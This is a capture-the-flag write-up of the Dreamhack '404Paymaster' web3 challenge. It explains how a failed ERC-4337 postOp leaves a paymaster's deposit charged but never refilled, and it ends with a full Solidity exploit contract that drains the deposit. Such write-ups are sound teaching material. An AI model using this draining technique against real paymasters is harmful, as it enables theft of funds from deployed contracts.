---
title: Blockchain - 404Paymaster
description: 2024 | Dreamhack Invitational | web3
tags:
    - smart contract
    - account abstraction
    - uniswap v2
---

## Description

Do you know what AA is? You should know that.

[:material-download: `404paymaster.zip`](static/404paymaster.zip)

## Solution

- The DN404 paymaster, which allows users to pay fees with DN404 tokens, has deposited `5 * 1e16` WETH into the entry point. To solve the challenge, we need to consume the paymaster's deposit to below `1e10`
- The entry point executes userOps by two loops: validation loop and execution loop

    ```js
    function handleOps(UserOperation[] calldata ops, address payable beneficiary) public nonReentrant {
        uint256 opslen = ops.length;
        UserOpInfo[] memory opInfos = new UserOpInfo[](opslen);

        unchecked {
            for (uint256 i = 0; i < opslen; i++) {
                UserOpInfo memory opInfo = opInfos[i];
                (uint256 validationData, uint256 pmValidationData) = _validatePrepayment(i, ops[i], opInfo);
                _validateAccountAndPaymasterValidationData(i, validationData, pmValidationData, address(0));
            }

            uint256 collected = 0;
            emit BeforeExecution();

            for (uint256 i = 0; i < opslen; i++) {
                collected += _executeUserOp(i, ops[i], opInfos[i]);
            }

            _compensate(beneficiary, collected);
        } //unchecked
    }
    ```

- During the validation loop, the required prefund fee is calculated based on arguments in userOps and deducted from the paymaster's deposit. Meanwhile, the paymaster will precharge DN404 tokens corresponding to 120% of the gas fee based on the cached price
- `handleOps()` will call `postOp()` on the paymaster after making the execution call. In the `postOp()`, the paymaster will refund tokens to users based on the actual gas cost and use the received tokens to refill the deposit
- Since DN404 tokens are charged at 120% of the fee, after normal execution, the paymaster's deposit will be higher than before execution. And the paymaster is using Uniswap V2 to swap DN404 tokens back to WETH. We may be able to manipulate the price by swapping, but the price cached in the paymaster obtains reserved data from the Uniswap V2 pair (i.e. flash loans won't work) and we hold too few tokens compared to the pair

    ```js
    function updateCachedPrice() public returns (uint256) {
        // This function updates the cached ERC20/mockETH price ratio from pair
        (address token0,) = sortTokens(address(token), address(mockWETH));
        (uint256 reserve0, uint256 reserve1,) = IUniswapV2Pair(pair).getReserves();
        (uint256 reserveToken, uint256 reserveNative) =
            address(token) == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
        require(reserveToken != 0, "reserveToken is zero");
        return cachedPrice = reserveNative * PRICE_DENOMINATOR / reserveToken;
    }
    ```

- If `innerHandleOp()` reverts due to `postOp` execution failure, the entry point will only roll back the current execution instead of the entire transaction and `postOp()` will be called again with `postOpReverted` mode. In this case, `postOp()` will do nothing, including refilling the deposit and refunding tokens. However, the storage that was changed during the validation loop will not be reverted and the entry point will be charged according to the gas consumed. Thus, the paymaster's deposit can be reduced

    ```js
    function _postOp(PostOpMode mode, bytes calldata context, uint256 actualGasCost) internal override {
        unchecked {
            ...
            if (mode == PostOpMode.postOpReverted) {
                emit PostOpReverted(userOpSender, preCharge);
                // Do nothing here to not revert the whole bundle and harm reputation
                return;
            }
            ...
        }
    }
    ```

- Utilize the Uniswap V2 reentrancy lock to cause swap to fail is an easy way to let `postOp()` reverts
- Then, since the gas price is under control, to increase `actualGasCost`, we need to consider how to consume as much gas as possible in a userOp
- The `actualGas` calculation consists of two parts: the gas consumed by the execution and user-provided `preVerificationGas`. The `preVerificationGas` is the extra gas to pay the bundler and can be used to increase gas consumption greatly

### Exploitation

```js
contract Hack {

    Challenge challenge;

    constructor(Challenge _challenge) {
        challenge = _challenge;
    }

    function exploit() external {
        address paymaster = challenge.paymaster();
        address dn = challenge._dn404();
        address weth = address(IDN404Paymaster(paymaster).mockWETH());
        IUniswapV2Factory factory = IUniswapV2Factory(challenge.uniV2factory());
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(dn, weth));
        IEntryPoint entryPoint = IDN404Paymaster(paymaster).entryPoint();

        challenge.register();
        IERC20(dn).approve(paymaster, type(uint256).max);
        uint nonce;
        uint mul = 1e10;
        while (!challenge.isSolved()) {
            // swap to lock the pair
            pair.swap(
                pair.token0() == dn ? 1 : 0,
                pair.token1() == dn ? 1 : 0,
                address(this),
                abi.encode(nonce++, mul)
            );
            // the required prefund should not exceed the paymaster's deposit
            if (entryPoint.balanceOf(paymaster) / 1e6 < mul) {
                mul /= 10;
            }
        }
    }

    function uniswapV2Call(
        address sender,
        uint,
        uint,
        bytes calldata data
    ) external {
        require(sender == address(this));
        address paymaster = challenge.paymaster();
        UserOperation[] memory ops = new UserOperation[](1);
        (uint nonce, uint mul) = abi.decode(data, (uint, uint));
        ops[0] = UserOperation({
            sender: address(this),
            nonce: nonce,
            initCode: new bytes(0),
            callData: new bytes(0),
            callGasLimit: 10000,
            verificationGasLimit: 110000,   // The amount of gas to allocate for the verification step
            preVerificationGas: 640000,
            maxFeePerGas: mul,
            maxPriorityFeePerGas: mul,
            paymasterAndData: abi.encodePacked(paymaster),
            signature: ""
        });
        IEntryPoint entryPoint = IDN404Paymaster(paymaster).entryPoint();
        entryPoint.handleOps(ops, payable(address(this)));

        IERC20(challenge._dn404()).transfer(msg.sender, 3);
    }

    function validateUserOp(
        UserOperation calldata,
        bytes32,
        uint256)
    external view returns (uint256 validationData) {
        validationData = block.timestamp << (48 + 160); // validAfter
    }
}
```

## References

- [ERC-4337: Account Abstraction Using Alt Mempool](https://eips.ethereum.org/EIPS/eip-4337#extension-paymasters)
- [[M-01] Balance check during `MagicSpend` validation cannot ensure that `MagicSpend` has enough balance to cover the requested fund](https://solodit.xyz/issues/m-01-balance-check-during-magicspend-validation-cannot-ensure-that-magicspend-has-enough-balance-to-cover-the-requested-fund-code4rena-coinbase-coinbase-git)
